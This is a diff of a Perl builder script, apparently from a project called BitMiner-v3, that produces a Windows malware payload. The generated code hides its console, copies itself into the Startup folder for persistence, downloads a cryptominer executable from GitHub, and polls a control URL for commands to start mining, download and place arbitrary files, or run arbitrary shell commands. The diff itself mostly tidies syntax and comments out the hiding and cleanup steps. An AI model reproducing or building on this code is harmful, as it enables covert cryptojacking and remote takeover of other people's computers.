@@ -86,54 +86,53 @@ sub generate{
 ### Modules ###
 
 BEGIN {
-  use Win32::HideConsole qw(hide_console);
-  hide_console;
+  use Win32::HideConsole "hide_console";
+  #hide_console;
 }
 
+use File::Basename "basename";
 use LWP::UserAgent qw(get agent decoded_content);
-use LWP::Simple qw(getstore);
+use LWP::Simple "getstore";
 use Config;
 
 #perl2exe_include Win32::HideConsole
+#perl2exe_include File::Basename
 #perl2exe_include LWP::UserAgent
 #perl2exe_include LWP::Simple
 #perl2exe_include Config
 
 ### Modules ###
 
-my $arq = $0;
-if($arq =~ /(.+)\/(.+)/){
-  $arq = $2;
-}
+my $arq = basename($0);
 
 while(1){
-  my $check = `dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup`;
-  while($check !~ $arq){
+  my $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
+  while($check !~ m/$arq/){
     system(\'copy \' . $arq . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
-    $check = `dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup`;
+    $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
   }
-  $check = `dir %AppData%`;
-  while($check !~ /NsCpuCNMiner\.exe/){
+  $check = qx/dir %AppData%/;
+  while($check !~ m/NsCpuCNMiner\.exe/){
     if($Config{archname} =~ /x86_64/ || $Config{archname} =~ /x64/){
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\', \'NsCpuCNMiner.exe\');
+      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner64.exe\', \'NsCpuCNMiner.exe\');
     }else{
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\', \'NsCpuCNMiner.exe\');
+      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner32.exe\', \'NsCpuCNMiner.exe\');
     }
     if(-e \'NsCpuCNMiner.exe\'){
       system(\'move NsCpuCNMiner.exe %AppData%\');
     }
-    $check = `dir %AppData%`;
+    $check = qx/dir %AppData%/;
   }
   my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0\');
   my $res = $get->get(\'', $_[0], '\');
-  if($res->decoded_content =~ /miner\[(.+),(.+)\]/){
+  if($res->decoded_content =~ m/miner\[(.+),(.+)\]/){
     system("cd %AppData% && NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
   }
-  if($res->decoded_content =~ /download\[(.+),(.+),(.+)\]/){
+  if($res->decoded_content =~ m/download\[(.+),(.+),(.+)\]/){
     getstore($1, $2);
     system(\'move \' . $2 . \' \' . $3);
   }
-  if($res->decoded_content =~ /system\[(.+)\]/){
+  if($res->decoded_content =~ m/system\[(.+)\]/){
     system($1);
   }
 }';
@@ -169,6 +168,6 @@ while(1){
   else{
     print "\n[", color("YELLOW"),"!",color("reset"), "] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !\n";
   }
-  unlink "output.pl";
+  #unlink "output.pl";
   sleep 3;
 }
